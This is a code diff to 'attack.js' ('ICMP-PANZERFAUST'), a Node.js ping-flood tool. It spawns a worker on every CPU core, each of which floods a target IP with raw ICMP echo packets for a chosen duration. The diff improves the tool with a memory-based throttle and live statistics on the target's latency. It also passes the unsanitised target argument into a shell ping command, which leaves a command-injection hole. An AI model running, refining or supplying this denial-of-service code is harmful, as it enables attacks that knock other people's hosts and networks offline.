@@ -4,27 +4,27 @@ const os = require('os');
 const { exec } = require('child_process');
 
 const target = process.argv[2];
-const duration = parseInt(process.argv[3]) * 1000;
+const duration = parseInt(process.argv[3]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node attack.js <target_ip> <duration_sec>');
+  console.log('Usage: node attack.js <target_ip> <duration_seconds>');
   process.exit(1);
 }
 
 const cores = os.cpus().length;
-const end = Date.now() + duration;
+const endTime = Date.now() + duration * 1000;
 
 if (cluster.isMaster) {
   let stats = { sent: 0, success: 0, failed: 0, maxpps: 0 };
   let lastLatency = 'N/A';
 
   console.clear();
-  console.log('ICMP-PANZERFAUST [JS-SAFE-SMASH]');
+  console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
   console.log('--------------------------------------');
   console.log(`Target: ${target}`);
-  console.log(`Duration: ${duration / 1000}s`);
+  console.log(`Duration: ${duration}s`);
   console.log(`Using ${cores} cores`);
-  console.log('Launching attack...\n');
+  console.log('Launching...\n');
 
   for (let i = 0; i < cores; i++) cluster.fork();
 
@@ -39,9 +39,10 @@ if (cluster.isMaster) {
     });
   }
 
+  // Live output every 2 seconds
   setInterval(() => {
     console.clear();
-    console.log('ICMP-PANZERFAUST [JS-SAFE-SMASH]');
+    console.log('ICMP-PANZERFAUST [AUTO-SAFE MODE]');
     console.log('--------------------------------------');
     console.log(`Success: ${stats.success}`);
     console.log(`Failed: ${stats.failed}`);
@@ -49,8 +50,10 @@ if (cluster.isMaster) {
     console.log(`Total Sent: ${stats.sent}`);
     console.log(`Target Latency: ${lastLatency} ms`);
     console.log('--------------------------------------');
-  }, 100);
+    stats.maxpps = 0;
+  }, 2000);
 
+  // Ping check
   setInterval(() => {
     exec(`ping -c 1 ${target}`, (err, stdout) => {
       const match = stdout.match(/time=([\d.]+) ms/);
@@ -60,9 +63,10 @@ if (cluster.isMaster) {
 
   setTimeout(() => {
     for (const id in cluster.workers) cluster.workers[id].kill();
-    console.log('\nAttack complete.');
+    console.log('\nAttack finished.');
     process.exit(0);
-  }, duration);
+  }, duration * 1000);
+
 } else {
   const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
 
@@ -71,6 +75,9 @@ if (cluster.isMaster) {
   let success = 0;
   let failed = 0;
   let pps = 0;
+
+  let safeMode = false;
+  let throttleUntil = 0;
 
   function checksum(buf) {
     let sum = 0;
@@ -81,17 +88,38 @@ if (cluster.isMaster) {
 
   function packet(seq) {
     const buf = Buffer.alloc(8);
-    buf.writeUInt8(8, 0); // type
-    buf.writeUInt8(0, 1); // code
-    buf.writeUInt16BE(0, 2); // checksum placeholder
-    buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
-    buf.writeUInt16BE(seq & 0xffff, 6); // seq
+    buf.writeUInt8(8, 0);
+    buf.writeUInt8(0, 1);
+    buf.writeUInt16BE(0, 2);
+    buf.writeUInt16BE(process.pid & 0xffff, 4);
+    buf.writeUInt16BE(seq & 0xffff, 6);
     buf.writeUInt16BE(checksum(buf), 2);
     return buf;
   }
 
   function loop() {
-    if (Date.now() >= end) return;
+    if (Date.now() >= endTime) return;
+
+    // Dynamic throttle based on memory
+    const mem = process.memoryUsage();
+    const usedMB = mem.heapUsed / 1024 / 1024;
+
+    if (!safeMode && usedMB > 700) {
+      safeMode = true;
+      throttleUntil = Date.now() + 10000;
+      console.log(`[Worker ${process.pid}] ENTERED SAFE MODE - RAM too high: ${usedMB.toFixed(1)}MB`);
+    }
+
+    if (safeMode && Date.now() > throttleUntil) {
+      safeMode = false;
+      console.log(`[Worker ${process.pid}] EXITED SAFE MODE - Resuming full power`);
+    }
+
+    const throttle = safeMode ? 1000 : 0;
+    const now = Date.now();
+
+    if (now >= endTime) return;
+
     const pkt = packet(seq++);
     socket.send(pkt, 0, pkt.length, target, (err) => {
       sent++;
@@ -99,7 +127,12 @@ if (cluster.isMaster) {
       if (err) failed++;
       else success++;
     });
-    setImmediate(loop);
+
+    if (throttle > 0) {
+      setTimeout(loop, throttle);
+    } else {
+      setImmediate(loop);
+    }
   }
 
   loop();
